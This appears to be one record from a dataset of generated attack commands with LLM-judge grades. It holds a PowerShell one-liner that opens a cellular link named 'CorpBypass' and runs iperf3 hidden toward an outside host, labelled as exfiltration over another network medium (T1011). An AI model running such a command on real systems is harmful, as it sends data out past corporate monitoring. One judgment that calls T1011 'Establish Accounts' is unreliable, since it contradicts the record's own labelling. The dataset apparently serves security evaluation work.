command: netsh mbn connect interface="Cellular" connmode=name name="CorpBypass" | Out-Null; $cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList "-c 100.72.55.9 -p 53433 -B $ip -t 60"
explanation: Establishes a mobile broadband session and binds iperf3 to the Cellular interface, exfiltrating via cellular data instead of enterprise LAN (T1011).
rationale_steps: Initiate a mobile broadband connection to enable the cellular medium.
Resolve the cellular interface IP address.
Bind iperf3 to that IP on an uncommon port for data egress.
Execute hidden to reduce casual observation.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper PowerShell syntax including balanced quotes, correct pipe operators, valid parameter names, proper error handling with -ErrorAction, and appropriate command separators.
llm_judgments.semantic_justification: The command aligns well with T1011 (Exfiltration Over Other Network Medium) by establishing a cellular connection outside the corporate network and using iperf3 to exfiltrate data, though it lacks encryption or obfuscation which would be typical in a real attack scenario.

llm_judgments.syntactic_justification: The command is perfectly well-formed with correct PowerShell syntax, balanced quotes, valid command separators, and proper use of cmdlets and native executables.
llm_judgments.semantic_justification: The command's actions of establishing a mobile broadband session and exfiltrating data via iperf3 have no semantic relation to creating or abusing accounts, which is the definition of MITRE ATT&CK T1011 (Establish Accounts).

llm_judgments.syntactic_justification: PowerShell command uses valid syntax with balanced quotes, proper separators, and correct parameter usage for netsh and Start-Process.
llm_judgments.semantic_justification: It establishes a cellular connection and binds client traffic to the cellular IP to egress out-of-band, though iperf3 only generates test data and there is no wait/check for link readiness.
